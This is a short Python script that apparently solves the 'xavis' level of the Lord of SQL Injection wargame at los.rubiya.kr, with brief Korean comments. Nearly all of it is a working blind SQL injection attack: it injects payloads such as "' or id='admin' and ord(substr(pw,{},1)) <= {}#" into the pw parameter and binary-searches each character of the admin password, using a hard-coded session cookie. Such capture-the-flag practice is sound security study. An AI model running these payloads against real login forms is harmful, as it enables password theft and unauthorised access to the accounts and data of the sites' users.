import requests
import string
string.printable

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookies = {
    'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'
}
params = {
    'pw' : None
}


for i in range(30):
    payload = "' or length(pw)={}#".format(i)
    params['pw'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print(payload)
        break

# Binary Search 이용
# 유니코드인데, 4바이트라고?

'''
response.text
'''
answer = []
i = 0
while True:
    i = i+1
    # Unicode Maximum 4byte
    start,end=0,2**32
    while True:
        search = int((start + end) / 2)
        payload = "' or id='admin' and ord(substr(pw,{},1)) <= {}#".format(i,search)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            # 같을 수도 있으니까 체크
            payload = "' or id='admin' and ord(substr(pw,{},1)) = {}#".format(i,search)
            params['pw'] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello admin" in response.text):
                print("[+] Find {}st character : {}".format(i,search))
                answer.append(search)
                break
            print("[+]",payload)
            end = search
        else:
            print("[-]",payload)
            start = search
    if(search == 0):
        break

for i in answer:
    print(chr(i),end='')


